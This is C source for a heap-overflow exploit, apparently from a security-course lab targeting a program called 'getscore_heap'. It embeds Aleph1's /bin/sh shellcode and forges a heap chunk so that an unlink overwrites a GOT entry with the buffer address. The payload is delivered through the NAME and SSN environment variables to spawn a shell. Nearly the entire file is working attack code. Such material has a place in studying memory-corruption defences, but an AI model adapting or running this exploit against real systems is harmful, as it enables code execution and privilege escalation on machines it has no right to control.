#include <stdio.h>
#include <stdlib.h>

#define NOP 0x90
#define NAME_STRING "NAME="
#define SSN_STRING "SSN="

/*
Aleph1's Linux shellcode
from "Smashing the stack for fun and profit",
Phrack 49, vol 7
*/
char shellcode[] =
   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char *argv[])
{
  char *name_buff, *ssn_buff, *name_command_buff, *ssn_command_buff;
  long where, what, *ptr;
  
  int bsize, name_bsize, ssn_bsize, name_command_bsize, ssn_command_bsize, i, name_offset, ssn_offset;

  if (argc < 4){
    printf("Usage: ./exploit <buflen> <addr_GOT> <addr_buffer>\n");
    return -1;
  }
   
  bsize = atoi(argv[1]);
  sscanf(argv[2], "%x", &where);
  sscanf(argv[3], "%x", &what);

  // printf("Length of shell code: %d\n", strlen(shellcode));
  if (bsize < strlen(shellcode) + 20){
    printf("Length of buffer is too small to contain the shell code.\n ");
    exit(0);
  }
  // printf("Using where: 0x%x\n", where-12);
  // printf("Using what: 0x%x\n", what+8);

  ssn_bsize = 8*4;
  name_bsize = bsize - ssn_bsize - 1;

  if(!(name_buff = malloc(name_bsize + 1))) {
    printf("Can't allocate exploit buffer.\n");
    exit(0);
  }

  if(!(ssn_buff = malloc(ssn_bsize + 1))) {
    printf("Can't allocate exploit buffer.\n");
    exit(0);
  }

  char *prefix = "XXXXYYYY"; // placeholders for forward and back links
  char *nop_jmp = "\x90\x90\x90\x90\x90\x90\xEB\x04";  // 6 NOPs, JMP +4
  char *overwrite = "ZZZZ";         //P->next->prev = P->prev. overwritten

  strcat(name_buff, prefix);
  strcat(name_buff, nop_jmp);
  strcat(name_buff, overwrite);
  strcat(name_buff, shellcode);

  // put some none-null character until the end of the buffer
  for (i=strlen(name_buff); i<name_bsize; i++){
    name_buff[i] = '\x90';
  }

  // fill the "normal part" (not overflowed part) of ssn buffer with nops
  for (i=0; i<4*4; i++) {
    ssn_buff[i] = '\x90';
  }

  // creating a fake heap structure
  ptr = (long *)(ssn_buff);
  ptr += 4; // move ptr to start of fake heap structure
  long size_of_next_chunk = -1;  // 0xFFFFFFFF
  *ptr = *(ptr+1) = size_of_next_chunk;
  *(ptr+2) = where - 12;
  *(ptr+3) = what + 8;

  ssn_buff[ssn_bsize] = 0;
  
  // set name buffer
  name_offset = strlen(NAME_STRING);
  name_command_bsize = name_offset + name_bsize + 1;
  if(!(name_command_buff = malloc(name_command_bsize))) {
    printf("Can't allocate command buffer.\n");
    exit(0);
  }
  strcpy(name_command_buff, NAME_STRING);
  strcat(name_command_buff, name_buff);

  // set ssn buffer
  ssn_offset = strlen(SSN_STRING);
  ssn_command_bsize = ssn_offset + ssn_bsize + 1;
  if(!(ssn_command_buff = malloc(ssn_command_bsize))) {
    printf("Can't allocate command buffer.\n");
    exit(0);
  }
  strcpy(ssn_command_buff, SSN_STRING);
  strcat(ssn_command_buff, ssn_buff);

  // set environment variables
  putenv(name_command_buff);
  putenv(ssn_command_buff);
  system("./getscore_heap $NAME $SSN");
}

